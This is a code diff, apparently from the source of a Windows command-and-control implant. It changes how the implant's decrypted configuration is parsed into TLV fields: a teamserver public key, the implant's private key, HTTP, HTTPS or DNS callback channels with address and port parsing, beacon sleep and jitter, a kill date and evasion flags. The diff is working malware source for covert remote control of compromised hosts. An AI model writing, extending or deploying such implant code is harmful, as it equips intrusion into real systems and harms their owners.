@@ -148,10 +148,9 @@ NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
     if (!ok)
         return (NTSTATUS)0xC000003A; /* decrypt failed */
 
-    /* Copy decrypted config (handle undersized blobs gracefully) */
-    DWORD copy_len = hdr->data_size < sizeof(IMPLANT_CONFIG)
-                         ? hdr->data_size : sizeof(IMPLANT_CONFIG);
-    spec_memcpy(&g_config, decrypted, copy_len);
+    /* The decrypted payload is a TLV stream — parse it into g_config */
+    spec_memset(&g_config, 0, sizeof(IMPLANT_CONFIG));
+    cfg_patch_tlv(&g_config, decrypted, hdr->data_size);
     spec_memset(decrypted, 0, sizeof(decrypted));
 
     ctx->config = &g_config;
@@ -240,8 +239,16 @@ NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
 /*  cfg_patch_tlv — apply TLV-encoded partial config updates           */
 /* ================================================================== */
 
-/* TLV field IDs for config patch messages */
-#define CFG_TLV_EVASION_FLAGS  0x88
+/* TLV field IDs — must match config_gen.rs config_field module */
+#define CFG_TLV_SERVER_PUBKEY       0x80
+#define CFG_TLV_IMPLANT_PRIVKEY     0x81
+#define CFG_TLV_CHANNEL_KIND        0x82
+#define CFG_TLV_CHANNEL_ADDRESS     0x83
+#define CFG_TLV_SLEEP_INTERVAL      0x84
+#define CFG_TLV_SLEEP_JITTER        0x85
+#define CFG_TLV_KILL_DATE           0x86
+#define CFG_TLV_PROFILE_BLOB        0x87
+#define CFG_TLV_EVASION_FLAGS       0x88
 
 static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) {
     DWORD pos = 0;
@@ -257,9 +264,122 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
         const BYTE *val = data + pos;
 
         switch (fid) {
+        case CFG_TLV_SERVER_PUBKEY:
+            if (vlen == 32)
+                spec_memcpy(cfg->teamserver_pubkey, val, 32);
+            break;
+
+        case CFG_TLV_IMPLANT_PRIVKEY:
+            if (vlen == 32)
+                spec_memcpy(cfg->implant_privkey, val, 32);
+            break;
+
+        case CFG_TLV_CHANNEL_KIND: {
+            /* Channel kind ("http", "https", "dns") — sets type for current channel */
+            DWORD idx = cfg->channel_count;
+            if (idx < CONFIG_MAX_CHANNELS) {
+                DWORD type = CHANNEL_HTTP; /* default */
+                if (vlen >= 3 && val[0] == 'd' && val[1] == 'n' && val[2] == 's')
+                    type = CHANNEL_DNS;
+                cfg->channels[idx].type = type;
+                cfg->channels[idx].active = TRUE;
+                cfg->channels[idx].priority = idx;
+            }
+            break;
+        }
+
+        case CFG_TLV_CHANNEL_ADDRESS: {
+            /* Parse URL: "http://host:port/path" → url=host, port=N
+               Supports: http://host:port/path, https://host/path,
+               host:port, host (bare hostname) */
+            DWORD idx = cfg->channel_count;
+            if (idx < CONFIG_MAX_CHANNELS) {
+                const char *s = (const char *)val;
+                DWORD slen = vlen;
+                DWORD default_port = 80;
+
+                /* Skip scheme and determine default port / TLS flag */
+                if (slen > 8 && s[0]=='h' && s[1]=='t' && s[2]=='t' &&
+                    s[3]=='p' && s[4]=='s' && s[5]==':' && s[6]=='/' && s[7]=='/') {
+                    s += 8; slen -= 8;
+                    default_port = 443;
+                    cfg->channels[idx].needs_tls = TRUE;
+                } else if (slen > 7 && s[0]=='h' && s[1]=='t' && s[2]=='t' &&
+                           s[3]=='p' && s[4]==':' && s[5]=='/' && s[6]=='/') {
+                    s += 7; slen -= 7;
+                    default_port = 80;
+                    cfg->channels[idx].needs_tls = FALSE;
+                } else {
+                    cfg->channels[idx].needs_tls = FALSE;
+                }
+
+                /* Extract host (up to ':' or '/' or end) */
+                DWORD hlen = 0;
+                while (hlen < slen && s[hlen] != ':' && s[hlen] != '/')
+                    hlen++;
+                DWORD copy = hlen < 255 ? hlen : 255;
+                spec_memcpy(cfg->channels[idx].url, s, copy);
+                cfg->channels[idx].url[copy] = 0;
+
+                /* Extract port if explicit, otherwise use default */
+                DWORD port = default_port;
+                if (hlen < slen && s[hlen] == ':') {
+                    DWORD pstart = hlen + 1;
+                    port = 0;
+                    while (pstart < slen && s[pstart] >= '0' && s[pstart] <= '9') {
+                        port = port * 10 + (s[pstart] - '0');
+                        pstart++;
+                    }
+                    if (port == 0) port = default_port;
+                }
+                cfg->channels[idx].port = port;
+
+                cfg->channel_count = idx + 1;
+            }
+            break;
+        }
+
+        case CFG_TLV_SLEEP_INTERVAL:
+            /* Builder sends u64 (seconds); implant stores milliseconds */
+            if (vlen >= 8) {
+                QWORD secs = *(const QWORD *)val;
+                cfg->sleep_interval = (DWORD)(secs * 1000);
+            } else if (vlen >= 4) {
+                cfg->sleep_interval = *(const DWORD *)val * 1000;
+            }
+            break;
+
+        case CFG_TLV_SLEEP_JITTER:
+            /* Builder sends 1 byte (percent 0-100) */
+            if (vlen >= 1)
+                cfg->jitter_percent = (DWORD)val[0];
+            break;
+
+        case CFG_TLV_KILL_DATE: {
+            /* Builder sends u64 Unix timestamp (seconds since 1970-01-01).
+               Convert to Windows FILETIME (100ns ticks since 1601-01-01).
+               FILETIME = (unix_secs + 11644473600) * 10000000 */
+            QWORD unix_ts = 0;
+            if (vlen >= 8)
+                unix_ts = *(const QWORD *)val;
+            else if (vlen >= 4)
+                unix_ts = (QWORD)(*(const DWORD *)val);
+            if (unix_ts != 0)
+                cfg->kill_date = (unix_ts + 11644473600ULL) * 10000000ULL;
+            break;
+        }
+
+        case CFG_TLV_PROFILE_BLOB:
+            /* Profile blob stored separately — attach to comms later */
+            cfg->profile_id = vlen; /* Stash blob length; actual parsing deferred */
+            break;
+
         case CFG_TLV_EVASION_FLAGS:
+            /* Builder sends 1 byte bitfield */
             if (vlen >= 4)
                 cfg->evasion_flags = *(const DWORD *)val;
+            else if (vlen >= 1)
+                cfg->evasion_flags = (DWORD)val[0];
             break;
 
         default:
